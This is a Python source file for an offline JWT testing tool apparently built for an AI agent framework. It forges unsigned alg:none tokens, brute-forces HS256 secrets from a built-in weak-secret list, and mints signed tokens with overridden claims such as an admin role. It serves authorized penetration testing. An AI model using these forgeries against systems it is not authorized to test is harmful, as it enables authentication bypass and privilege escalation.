"""jwt_attack — the JWT test kit a pentester actually needs, offline and stdlib-only.

``decode_encode``'s ``jwt-decode`` only reads a token. This tool *tests* it:

* ``decode``        — header + payload, pretty-printed (no verification).
* ``alg-none``      — forge an unsigned token (``alg:none``) with claim overrides — the classic
                      signature-stripping bypass to try against a weak verifier.
* ``crack-hs256``   — brute the HMAC secret from a built-in weak-secret list (+ any you supply);
                      if it cracks, the token's integrity is broken.
* ``forge-hs256``   — mint a validly-signed token once you know the secret (e.g. after cracking),
                      with claim overrides (``{"role":"admin"}``) — proves the impact.
* ``verify-hs256``  — check a token against a candidate secret.

Pure ``hmac``/``hashlib``/``base64``; no network, so it's always safe and instantly testable.
This is authorized-testing tradecraft: it forges tokens *locally* for you to try against your
authorized target via the HTTP tools — it does not attack anything by itself.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Any

from ai_framework.tools.base import ToolContext

# A small built-in weak-secret list (the usual suspects); callers can extend via ``secrets``.
WEAK_SECRETS = (
    "secret", "password", "123456", "changeme", "admin", "jwt", "key", "test", "secretkey",
    "your-256-bit-secret", "s3cr3t", "supersecret", "private", "token", "qwerty", "letmein",
    "default", "root", "hs256", "signingkey", "mysecret", "",
)


def _b64url_decode(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def _json_seg(obj: Any) -> str:
    return _b64url_encode(json.dumps(obj, separators=(",", ":")).encode())


def _parts(token: str) -> tuple[dict, dict, str]:
    bits = token.split(".")
    if len(bits) < 2:
        raise ValueError("not a JWT (expected header.payload[.signature])")
    header = json.loads(_b64url_decode(bits[0]))
    payload = json.loads(_b64url_decode(bits[1]))
    signature = bits[2] if len(bits) > 2 else ""
    return header, payload, signature


def _sign_hs256(signing_input: str, secret: str) -> str:
    mac = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    return _b64url_encode(mac)


class JwtAttackTool:
    name = "jwt_attack"
    description = (
        "Test/forge JWTs locally (no network). ops: decode | alg-none | crack-hs256 | "
        "forge-hs256 | verify-hs256. Supply 'token'; 'claims' to override payload fields; "
        "'secret' or 'secrets' for HS256. Forges tokens for you to replay against an "
        "authorized target — it does not send anything itself."
    )
    touches_network = False
    mutating = False

    @property
    def json_schema(self) -> dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "op": {
                    "type": "string",
                    "enum": ["decode", "alg-none", "crack-hs256", "forge-hs256", "verify-hs256"],
                },
                "token": {"type": "string", "description": "The JWT to operate on"},
                "claims": {"type": "object", "description": "Payload fields to set/override"},
                "secret": {"type": "string", "description": "HMAC secret (forge/verify)"},
                "secrets": {
                    "type": "array", "items": {"type": "string"},
                    "description": "Extra candidate secrets for crack-hs256",
                },
            },
            "required": ["op"],
        }

    def run(self, args: dict[str, Any], ctx: ToolContext) -> str:
        op = args["op"]
        token = str(args.get("token", ""))
        claims = args.get("claims") or {}
        if not isinstance(claims, dict):
            raise ValueError("claims must be an object")

        if op == "decode":
            header, payload, sig = _parts(token)
            return (
                f"header:\n{json.dumps(header, indent=2)}\n\n"
                f"payload:\n{json.dumps(payload, indent=2)}\n\n"
                f"signature: {sig or '(none)'}"
            )

        if op == "alg-none":
            _, payload, _ = _parts(token) if token else ({}, {}, "")
            payload = {**payload, **claims}
            header = {"alg": "none", "typ": "JWT"}
            forged = f"{_json_seg(header)}.{_json_seg(payload)}."
            return (
                "alg=none forged token (try alg variants none/None/NONE if rejected):\n"
                f"{forged}\n\npayload: {json.dumps(payload)}"
            )

        if op == "verify-hs256":
            secret = str(args.get("secret", ""))
            header, payload, sig = _parts(token)
            signing_input = token.rsplit(".", 1)[0]
            ok = hmac.compare_digest(_sign_hs256(signing_input, secret), sig)
            return f"HS256 verify with secret {secret!r}: {'VALID' if ok else 'invalid'}"

        if op == "crack-hs256":
            _, _, sig = _parts(token)
            signing_input = token.rsplit(".", 1)[0]
            candidates = list(WEAK_SECRETS) + [str(s) for s in (args.get("secrets") or [])]
            for cand in candidates:
                if hmac.compare_digest(_sign_hs256(signing_input, cand), sig):
                    return (
                        f"CRACKED — HS256 secret is {cand!r} (tried {len(candidates)} candidates). "
                        f"The token's integrity is broken; forge with forge-hs256."
                    )
            return f"not cracked ({len(candidates)} candidates tried). Supply more via 'secrets'."

        if op == "forge-hs256":
            secret = str(args.get("secret", ""))
            if not secret:
                raise ValueError("forge-hs256 needs 'secret'")
            _, payload, _ = _parts(token) if token else ({}, {}, "")
            payload = {**payload, **claims}
            header = {"alg": "HS256", "typ": "JWT"}
            signing_input = f"{_json_seg(header)}.{_json_seg(payload)}"
            forged = f"{signing_input}.{_sign_hs256(signing_input, secret)}"
            return (
                f"HS256 forged token (secret {secret!r}):\n{forged}\n\n"
                f"payload: {json.dumps(payload)}"
            )

        raise ValueError(f"unknown op: {op}")
